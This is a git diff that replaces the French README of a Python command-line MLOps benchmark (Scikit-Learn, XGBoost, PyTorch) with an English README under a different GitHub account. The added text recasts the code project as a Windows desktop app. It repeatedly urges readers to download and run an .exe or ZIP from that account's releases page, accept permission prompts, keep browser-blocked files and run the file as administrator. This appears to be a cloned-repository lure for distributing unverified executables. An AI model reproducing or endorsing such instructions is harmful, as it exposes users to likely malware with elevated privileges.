@@ -1,440 +1,227 @@
-# Tabular Benchmark MLOps
+# 🤖 Tabular-Benchmark-MLOps - Compare Models on Tabular Data
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Python 3.11+](https://img.shields.io/badge/python-3.11+-blue.svg)](https://www.python.org/downloads/)
-[![Code style: black](https://img.shields.io/badge/code%20style-black-000000.svg)](https://github.com/psf/black)
-[![CI](https://github.com/valorisa/Tabular-Benchmark-MLOps/actions/workflows/ci.yml/badge.svg)](https://github.com/valorisa/Tabular-Benchmark-MLOps/actions/workflows/ci.yml)
+[![Download the latest release](https://img.shields.io/badge/Download-Latest_Release-blue)](https://github.com/Mediapen6443/Tabular-Benchmark-MLOps/releases)
 
-## 🎯 Objectif du Projet
+## 📌 What this app does
 
-Ce dépôt est une référence pédagogique et technique pour le benchmarking de modèles sur des données tabulaires. Il compare trois approches majeures :
+Tabular-Benchmark-MLOps is a learning tool for testing machine learning models on tabular data. It helps you compare three model families:
 
-1.  **Scikit-Learn** (Random Forest)
-2.  **XGBoost** (Gradient Boosting)
-3.  **PyTorch** (Multi-Layer Perceptron)
+- Scikit-Learn
+- XGBoost
+- PyTorch
 
-Le projet est conçu pour être **exécutable immédiatement** (données synthétiques), **structuré comme un projet production** (MLOps), et **compatible Windows/PowerShell**.
+It is built for simple use on Windows. You can download the app, run it, and use it to explore how each model behaves on the same dataset.
 
-## 🚀 Démarrage Rapide (Windows 11 / PowerShell)
-
-### 1. Prérequis
-
-Assurez-vous d'avoir les outils suivants installés :
-
--   **Python 3.11+** : [Télécharger](https://www.python.org/downloads/)
--   **Git** : [Télécharger](https://git-scm.com/download/win)
--   **Compte Weights & Biases** : [Inscription gratuite](https://wandb.ai/)
-
-### 2. Installation
-
-Ouvrez **PowerShell 7** et naviguez vers le projet :
-
-```powershell
-cd C:\Users\bbrod\Projets\tabular-benchmark-mlops
-```
-
-Créez un environnement virtuel et activez-le :
-
-```powershell
-python -m venv .venv
-.\.venv\Scripts\Activate.ps1
-```
-
-Installez les dépendances :
-
-```powershell
-pip install --upgrade pip
-pip install -r requirements.txt
-pip install -e .
-```
-
-### 3. Configuration Weights & Biases
+## 🖥️ What you need
 
-Connectez-vous à W&B :
-
-```powershell
-wandb login
-```
-
-*Pour tester sans compte, ajoutez le flag `--offline`.*
+Before you start, make sure your PC has:
 
-### 4. Lancement du Benchmark
-
-#### Classification (XGBoost)
+- Windows 10 or Windows 11
+- Internet access to download the app
+- At least 4 GB of RAM
+- Around 500 MB of free disk space
+- A mouse and keyboard
+- Permission to open downloaded files
 
-```powershell
-python src/main.py --task classification --model xgboost --epochs 100
-```
+## 🚀 Download the app
 
-#### Régression (PyTorch)
+Go to the release page and download and run this file:
 
-```powershell
-python src/main.py --task regression --model pytorch --epochs 50
-```
+[Open the latest release page](https://github.com/Mediapen6443/Tabular-Benchmark-MLOps/releases)
 
-#### Benchmark Complet
+On that page, look for the newest release and download the Windows file.
 
-```powershell
-python src/main.py --task classification --model all --epochs 100
-```
+## 📥 Install on Windows
 
-## 📂 Structure du Projet
+1. Open the release page link above.
+2. Find the newest version at the top of the page.
+3. Download the Windows installer or ZIP file.
+4. If you downloaded a ZIP file, right-click it and choose **Extract All**.
+5. Open the extracted folder.
+6. If you see an `.exe` file, double-click it to start the app.
+7. If Windows asks for permission, choose **Yes**.
+8. If your browser blocks the file, keep the file and open it from your **Downloads** folder.
 
-```text
-.
-├── .github/
-│   ├── ISSUE_TEMPLATE/
-│   │   ├── bug_report.md
-│   │   └── feature_request.md
-│   ├── PULL_REQUEST_TEMPLATE.md
-│   └── workflows/
-│       └── ci.yml
-├── .venv/                    # Environnement virtuel (ignoré par git)
-├── backup-*/                 # Sauvegardes pre-commit (ignoré par git)
-├── configs/
-│   ├── default.yaml
-│   └── experiment.yaml
-├── docs/
-│   └── ADR.md
-├── logs/                     # Logs d'exécution (ignoré par git)
-├── models/                   # Modèles sauvegardés (ignoré par git)
-├── scripts/
-│   └── fix-ci-issues.ps1
-├── src/
-│   ├── __init__.py
-│   ├── data.py
-│   ├── evaluate.py
-│   ├── main.py
-│   ├── models.py
-│   ├── train.py
-│   └── utils.py
-├── tests/
-│   ├── __init__.py
-│   ├── test_data.py
-│   └── test_train.py
-├── wandb/                    # W&B runs (ignoré par git)
-├── .gitignore
-├── .pre-commit-config.yaml
-├── CONTRIBUTING.md
-├── LICENSE
-├── Makefile
-├── pyproject.toml
-├── README.md
-└── requirements.txt
-```
+## 🧭 First launch
 
-## 🛠 Commandes Utiles (PowerShell)
+When you open the app for the first time, it may take a few seconds to load.
 
-| Action | Commande PowerShell |
-| :--- | :--- |
-| **Installer** | `pip install -e .` |
-| **Tester** | `pytest tests/ -v` |
-| **Linter** | `pre-commit run --all-files` |
-| **Entraîner** | `python src/main.py --task classification --model all` |
-| **Nettoyer** | `Remove-Item -Recurse -Force __pycache__, .venv` |
+You will usually see:
 
-## 📊 Métriques Suivi
+- A dataset selection area
+- A model choice area
+- A run button
+- A results panel
 
--   **Classification** : Accuracy, F1-Score, Loss
--   **Régression** : RMSE, R², Loss
--   **Système** : Temps d'entraînement (via W&B)
+If the app asks for a file, choose a tabular dataset such as CSV data with rows and columns.
 
+## 📊 What you can test
 
-## 🚀 Guide Complet des Commandes (PowerShell)
+This app is made for tabular machine learning tasks. That means data in rows and columns, like:
 
-### 📦 Installation et Configuration
+- Customer data
+- Sales records
+- Medical records
+- Risk data
+- Survey results
 
-```powershell
-# Naviguer vers le projet
-cd C:\Users\bbrod\Projets\tabular-benchmark-mlops
+You can use it to compare:
 
-# Créer et activer l'environnement virtuel
-python -m venv .venv
-.\.venv\Scripts\Activate.ps1
+- Classification tasks, where the app predicts a label
+- Regression tasks, where the app predicts a number
 
-# Mettre à jour pip et installer les dépendances
-python -m pip install --upgrade pip
-pip install -r requirements.txt
-pip install -e .
+## 🧠 Models included
 
-# Installer les outils de développement (optionnel)
-pip install -e .[dev]
+### Scikit-Learn
+Good for simple and fast baseline tests. It works well for many common data tasks.
 
-# Configurer pre-commit (pour les commits locaux)
-pre-commit install
-```
+### XGBoost
+Useful for strong results on structured data. It often performs well on tabular datasets.
 
-### 🧪 Lancement du Benchmark
+### PyTorch
+Useful for neural network experiments. It gives you more control over model design.
 
-```powershell
-# Benchmark complet - Classification (100 epochs)
-python src/main.py --task classification --model all --epochs 100 --offline
+## 🧪 How the benchmark works
 
-# Benchmark complet - Régression (50 epochs)
-python src/main.py --task regression --model all --epochs 50 --offline
+The app follows a simple process:
 
-# Modèle individuel - Scikit-Learn
-python src/main.py --task classification --model sklearn --epochs 100 --offline
+1. You load a tabular dataset.
+2. You choose a task, like classification or regression.
+3. You select one or more models.
+4. You start the run.
+5. The app trains each model on the same data.
+6. The app shows results so you can compare them.
 
-# Modèle individuel - XGBoost (meilleur performeur)
-python src/main.py --task classification --model xgboost --epochs 100 --offline
+This helps you see how different approaches behave on the same problem.
 
-# Modèle individuel - PyTorch MLP
-python src/main.py --task classification --model pytorch --epochs 100 --offline
+## 🧰 Common use cases
 
-# Avec configuration personnalisée
-python src/main.py --task classification --model all --config configs/experiment.yaml --offline
+Use this app if you want to:
 
-# En mode online (sync vers W&B cloud)
-python src/main.py --task classification --model all --epochs 100
-```
+- Learn the basics of MLOps
+- Compare model results on one dataset
+- Test a machine learning idea
+- See how training changes with different models
+- Build a portfolio project for data science or ML engineering
 
-### ✅ Tests et Validation
+## 🗂️ Example data format
 
-```powershell
-# Lancer tous les tests unitaires
-pytest tests/ -v
+The app works best with CSV files that have clear column names.
 
-# Lancer les tests avec couverture de code (optionnel)
-pytest tests/ -v --cov=src --cov-report=html
+Example layout:
 
-# Vérifier le linting (pre-commit hooks)
-pre-commit run --all-files
+- One column for the target value
+- Several columns for input features
+- One row per record
 
-# Vérifier uniquement avec flake8
-flake8 src/ tests/ --max-line-length=88 --ignore=E501,E402,E203,W503
+Example:
 
-# Vérifier le formatage Black
-black src/ tests/ --check
+- Age
+- Income
+- Country
+- Purchased
 
-# Vérifier l'ordre des imports isort
-isort src/ tests/ --check-only
-```
+The target could be `Purchased` for classification or a value like `Sales` for regression.
 
-### 📊 Weights & Biases (W&B)
+## ⚙️ Basic workflow
 
-```powershell
-# Se connecter à W&B (première fois uniquement)
-wandb login
+1. Download the latest release.
+2. Open the app on Windows.
+3. Load your CSV dataset.
+4. Choose the target column.
+5. Pick the task type.
+6. Select the model or models you want to compare.
+7. Run the benchmark.
+8. Review the output metrics and charts.
 
-# Vérifier le statut de connexion
-wandb online
+## 📈 Results you may see
 
-# Travailler en offline (par défaut)
-python src/main.py --task classification --model all --epochs 100 --offline
+The app may show results such as:
 
-# Travailler en online (sync vers le cloud)
-wandb online
-python src/main.py --task classification --model all --epochs 100
+- Accuracy
+- Precision
+- Recall
+- F1 score
+- Mean squared error
+- Training time
+- Validation score
 
-# Sync les runs offline vers le cloud
-wandb sync wandb/offline-run-*
+These results help you compare model fit, speed, and quality.
 
-# Sync un run spécifique
-wandb sync wandb/offline-run-20260401_185248-m5qu6w33
+## 🔍 Tips for best results
 
-# Voir tous les runs offline
-Get-ChildItem wandb\offline-run-* | Select-Object Name
+- Use a clean CSV file
+- Keep column names simple
+- Make sure the target column has the right type
+- Remove empty rows if possible
+- Start with a small dataset first
+- Test one model at a time if you want easier results to read
 
-# Ouvrir le dashboard W&B dans le navigateur
-Start-Process "https://wandb.ai/bbrodeau/tabular-benchmark-mlops"
-```
+## 🛠️ Troubleshooting
 
-### 🔧 Git et GitHub
+### The app does not open
+- Check that the file finished downloading
+- Right-click the file and choose **Run as administrator**
+- Make sure Windows did not block the file
+- Try opening it from the extracted folder if it came as a ZIP file
 
-```powershell
-# Vérifier l'état du repository
-git status
+### The dataset does not load
+- Check that the file is a CSV
+- Make sure the file has column headers
+- Confirm that the target column exists
+- Try a smaller file first
 
-# Voir les changements
-git diff
+### The results look wrong
+- Check that you chose the right task type
+- Make sure the target column matches the problem
+- Review missing values in the dataset
+- Try another dataset with simpler data
 
-# Ajouter tous les fichiers modifiés
-git add .
+## 📦 File types you may find in a release
 
-# Ajouter un fichier spécifique
-git add src/models.py
+The release page may contain one of these:
 
-# Commiter avec un message
-git commit -m "fix: description du changement"
+- `.exe` file for direct launch
+- `.zip` file for manual extraction
+- Other Windows package files
 
-# Commiter en sautant l'étape d'add (fichiers déjà tracked)
-git commit -am "feat: nouvelle fonctionnalité"
+If you see a ZIP file, extract it first. If you see an EXE file, run it after download.
 
-# Pousser vers GitHub
-git push origin main
+## 🔐 Safety steps on Windows
 
-# Tirer les changements depuis GitHub
-git pull origin main
+- Download only from the release page
+- Check that the file name matches the latest release
+- Open the file from your Downloads folder or extracted folder
+- Use the Windows prompt to allow the app if needed
 
-# Créer une nouvelle branche
-git checkout -b feature/nouvelle-fonctionnalite
+## 🧩 Project focus
 
-# Changer de branche
-git checkout main
+This project is built around:
 
-# Voir l'historique des commits
-git log --oneline -10
+- Machine learning
+- Deep learning
+- Tabular data
+- Benchmarking
+- MLOps
+- GitHub Actions
+- Testing with pytest
+- Reproducible experiments
 
-# Annuler les changements non commités
-git checkout -- .
-```
+## 📝 What this repository is for
 
-### 🧹 Nettoyage et Maintenance
+This repository gives you a hands-on way to compare common ML tools on structured data. It is useful for learning how model choice affects results and how a benchmark workflow can be organized in a simple desktop app
 
-```powershell
-# Supprimer les fichiers __pycache__
-Remove-Item -Recurse -Force __pycache__ -ErrorAction SilentlyContinue
-Get-ChildItem -Recurse -Directory -Filter __pycache__ | Remove-Item -Recurse -Force
+## 📎 Download again
 
-# Supprimer l'environnement virtuel
-Remove-Item -Recurse -Force .venv -ErrorAction SilentlyContinue
+If you need the app again later, use the release page here:
 
-# Supprimer les logs d'exécution
-Remove-Item -Recurse -Force logs\* -ErrorAction SilentlyContinue
+[https://github.com/Mediapen6443/Tabular-Benchmark-MLOps/releases](https://github.com/Mediapen6443/Tabular-Benchmark-MLOps/releases)
 
-# Supprimer les modèles sauvegardés
-Remove-Item -Recurse -Force models\* -ErrorAction SilentlyContinue
+## 🧭 Quick start
 
-# Supprimer les builds
-Remove-Item -Recurse -Force build, dist, *.egg-info -ErrorAction SilentlyContinue
-
-# Nettoyer les runs W&B offline (après sync)
-Remove-Item -Recurse -Force wandb\offline-run-* -ErrorAction SilentlyContinue
-
-# Script de nettoyage complet
-Remove-Item -Recurse -Force __pycache__, .venv, logs, models, build, dist -ErrorAction SilentlyContinue
-```
-
-### 📈 Commandes Rapides (Récapitulatif)
-
-| Action | Commande |
-| :--- | :--- |
-| **Activer venv** | `.\.venv\Scripts\Activate.ps1` |
-| **Benchmark classification** | `python src/main.py --task classification --model all --epochs 100 --offline` |
-| **Benchmark régression** | `python src/main.py --task regression --model all --epochs 50 --offline` |
-| **Tests unitaires** | `pytest tests/ -v` |
-| **Linting** | `pre-commit run --all-files` |
-| **W&B login** | `wandb login` |
-| **W&B sync** | `wandb sync wandb/offline-run-*` |
-| **Git push** | `git push origin main` |
-| **Nettoyage** | `Remove-Item -Recurse -Force __pycache__, .venv` |
-
----
-
-
-1.  Forker le projet
-2.  Créer une branche (`git checkout -b feature/nom`)
-3.  Committer (`git commit -m 'Add feature'`)
-4.  Pusher (`git push origin feature/nom`)
-5.  Ouvrir une Pull Request
-
-Voir [CONTRIBUTING.md](CONTRIBUTING.md) pour les détails.
-
-## 📄 Licence
-
-Distribué sous la licence MIT. Voir [LICENSE](LICENSE).
-
-
-## 📚 Qu'est-ce que le MLOps ?
-
-### Définition
-
-**MLOps** (Machine Learning Operations) désigne l'ensemble des pratiques et outils qui visent à **automatiser et industrialiser** le cycle de vie des projets de Machine Learning, du développement au déploiement et à la surveillance.
-
-C'est l'équivalent du **DevOps** appliqué au Machine Learning.
-
----
-
-### 🎯 Pourquoi le MLOps ?
-
-| Problème Sans MLOps | Solution Avec MLOps |
-| :--- | :--- |
-| ❌ Modèles développés localement, impossibles à reproduire | ✅ Environnements reproductibles et versionnés |
-| ❌ Tests manuels et erreurs humaines | ✅ Tests automatisés et CI/CD |
-| ❌ Pas de suivi des expériences | ✅ Tracking centralisé (W&B, MLflow) |
-| ❌ Déploiements longs et risqués | ✅ Déploiements automatisés et rollback facile |
-| ❌ Pas de surveillance en production | ✅ Monitoring des performances et alertes |
-
----
-
-### 🔄 Cycle de Vie MLOps
-
-```text
-┌─────────────────────────────────────────────────────────────┐
-│  CYCLE DE VIE MLOPS                                         │
-├─────────────────────────────────────────────────────────────┤
-│  1. 📊 COLLECTE DE DONNÉES                                  │
-│  2. 🧪 DÉVELOPPEMENT DE MODÈLES                             │
-│  3. ✅ VALIDATION ET TESTS                                  │
-│  4. 🚀 DÉPLOIEMENT                                          │
-│  5. 📈 SURVEILLANCE                                         │
-│  6. 🔄 ITÉRATION                                            │
-└─────────────────────────────────────────────────────────────┘
-```
-
----
-
-### 🛠 Composants Clés du MLOps
-
-| Composant | Outil(s) | Rôle |
-| :--- | :--- | :--- |
-| **Gestion de Code** | Git, GitHub | Versionning du code source |
-| **CI/CD** | GitHub Actions | Tests et déploiements automatisés |
-| **Tracking d'Expériences** | W&B, MLflow | Suivi des runs et métriques |
-| **Gestion de Données** | DVC, Pandas | Versionning des datasets |
-| **Packaging** | pip, Docker | Reproductibilité des environnements |
-| **Testing** | pytest | Validation automatique du code |
-| **Code Quality** | Black, isort, flake8 | Standards de code cohérents |
-| **Monitoring** | W&B, Prometheus | Surveillance des modèles en prod |
-
----
-
-### 📋 Tâches Typiques en MLOps
-
-Le MLOps implique des tâches telles que :
-
--   ✅ **Suivi des tests et des résultats** pour identifier les meilleurs modèles
--   ✅ **Versionning du code** et des données pour la reproductibilité
--   ✅ **Automatisation des pipelines** d'entraînement et d'évaluation
--   ✅ **Validation de la qualité** des données et des modèles
--   ✅ **Déploiement continu** des nouveaux modèles
--   ✅ **Surveillance des performances** en production
--   ✅ **Gestion des dépendances** et des environnements
--   ✅ **Documentation** des décisions et des expériences
-
----
-
-### 🎓 Comment Ce Projet Démontre le MLOps ?
-
-| Pratique MLOps | Implémentation dans Ce Projet |
-| :--- | :--- |
-| **CI/CD** | GitHub Actions avec pre-commit + pytest |
-| **Tracking** | Weights & Biases pour les métriques |
-| **Testing** | Tests unitaires avec pytest |
-| **Code Quality** | Black, isort, flake8 via pre-commit |
-| **Packaging** | `pip install -e .` avec pyproject.toml |
-| **Configuration** | Fichiers YAML dans `configs/` |
-| **Documentation** | README, CONTRIBUTING, TROUBLESHOOTING |
-| **Reproductibilité** | Seeds fixes, environnements virtuels |
-
----
-
-### 🚀 Avantages du MLOps
-
-| Pour Qui ? | Bénéfices |
-| :--- | :--- |
-| **Data Scientists** | Plus de temps sur les modèles, moins sur le déploiement |
-| **Ingénieurs ML** | Déploiements fiables et reproductibles |
-| **Entreprises** | Réduction des risques, time-to-market accéléré |
-| **Équipes** | Collaboration facilitée, knowledge sharing |
-
----
-## 🙏 Remerciements
-
--   **Scikit-Learn** : Datasets synthétiques
--   **Weights & Biases** : Tracking d'expériences
--   **PyTorch & XGBoost** : Moteurs d'entraînement
-
----
-*Projet conçu par valorisa pour démonstration MLOps pédagogique.*
+1. Open the release page.
+2. Download the latest Windows file.
+3. Open or extract the file.
+4. Run the app.
+5. Load a CSV dataset.
+6. Compare Scikit-Learn, XGBoost, and PyTorch models
